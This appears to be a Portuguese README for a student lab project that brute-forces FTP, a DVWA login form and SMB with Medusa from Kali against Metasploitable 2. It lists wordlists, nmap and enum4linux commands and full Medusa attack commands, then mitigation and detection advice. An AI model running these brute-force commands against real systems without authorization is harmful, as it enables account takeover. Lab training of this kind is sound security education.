# Projeto-Ataques-de-For-a-Bruta-com-Medusa-Kali-Metasploitable-DVWA-
Aviso legal &amp; ético: todos os testes descritos aqui foram concebidos para execução apenas em ambientes controlados e autorizados (suas VMs). Realizar ataques em sistemas alheios é ilegal.

*Resumo*:

Neste projeto foi configurado um laboratório local (Kali Linux atuando como atacante e Metasploitable 2 / DVWA como alvo) para simular ataques de força bruta usando a ferramenta Medusa. O objetivo foi compreender as técnicas de brute force em diferentes serviços (FTP, formulário web e SMB).

*Topologia / IPs (exemplo do laboratório)*:

  * Kali (atacante): 192.168.56.103

  * Metasploitable 2 / DVWA (alvo): 192.168.56.102

  * Rede VirtualBox: Host-only / Internal network.


*Ferramentas utilizadas*:

  * Kali Linux (Medusa, Nmap, enum4linux, smbclient)

  * Metasploitable 2 e/ou DVWA (alvo vulnerável)

  * VirtualBox (host-only network)


*Configuração do ambiente (resumo)*:

Crie duas VMs no VirtualBox: Kali Linux e Metasploitable 2 (ou outra VM LAMP com DVWA).

Configure rede como Host-only ou Internal Network para isolar o laboratório.


*Wordlists (exemplos simples)*:

_wordlists/user.txt_

admin
msfadmin
root

_wordlists/pass.txt_

123456
password
querty
msfadmin


*Reconhecimento com Nmap*:

Antes de atacar, identifique portas e serviços:
nmap -sS -sV -p- 192.168.56.102 -oN nmap_full_scan.txt
(Esse comando retorna as portas, serviços e seus status se estão abertos ou fechados)

*Ataque FTP (força bruta) — Medusa*:
Com lista de usuários (-U) e lista de senhas (-P):
medusa -M ftp -h 192.168.56.102 -U wordlists/small-userlist.txt -P wordlists/small-passlist.txt -t 10
(Esse comando utiliza as wordlists criadas com usuários e senhas para realizar testes visando identificar a combinação certa para acessar um determinado serviço)

Validação: se Medusa trouxer SUCCESS, tente se conectar manualmente:
ftp 192.168.56.102
(após colocar o comando ele irá pedir para colocar o usuário e senha e assim que colocar o usuario e senha validado terá acesso).


*Ataque a formulário web (DVWA) — Medusa (web-form)*:

Brute force em formulários exige capturar o POST exato e o texto de falha (deny signal).
medusa -h 192.168.56.102 -M web-form \
-u admin -P wordlists/small-passlist.txt \
-m FORM:"/dvwa/login.php" \
-m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
-m DENY-SIGNAL:"Login failed" \
-t 8

Como obter os valores corretos: use as DevTools do navegador (Network) para inspecionar o request POST e a resposta que indica falha. Substitua DENY-SIGNAL pelo texto real de erro.


*Enumeração e Password Spraying em SMB*:

Enumeração de usuários:
enum4linux -a 192.168.56.102 > enum4linux_users.txt
smbclient -L //192.168.56.102 -N

Password spraying (Medusa):
medusa -M smbnt -h 192.168.56.101 -U wordlists/small-userlist.txt -P wordlists/small-passlist.txt -t 6


*Recomendações de mitigação*:

FTP

  * Desativar FTP plain ou exigir FTPS/SFTP.

  * Desabilitar login anônimo.

  * Política de senhas fortes e bloqueio de conta após X tentativas.

Web (formulários)

  * Implementar limitação de taxa por IP e mecanismos de lockout.

  * Usar CAPTCHA progressivo após X tentativas.

  * Implementar WAF e monitoramento de padrões de login.

  * Armazenar senhas com hashing forte (bcrypt/argon2) e salt.

SMB

  * Impor políticas de senha fortes e lockout.

  * Desabilitar protocolos/algoritmos fracos (ex.: NTLMv1).

  * Habilitar SMB signing e monitoramento de logs.

Detecção

  * Configurar alertas em SIEM/IDS para múltiplas tentativas de login (por IP/usuário).

  * Manter logs de autenticação e análise de anomalias.


*Conclusão*:

Neste laboratório pratiquei reconhecimento, automatização de ataques de força bruta com Medusa e validação de acessos em um ambiente controlado. Aprendi a ajustar configurações de web-form para brute force em formulários, a importância de wordlists adequadas e o cuidado necessário para não impactar a estabilidade das VMs.


*Referências*:

  * Man pages e documentação do Medusa (man medusa, medusa -d).

  * Documentação Kali Tools (Nmap, enum4linux, smbclient).

  * DVWA (Damn Vulnerable Web Application) — ambiente de prática.
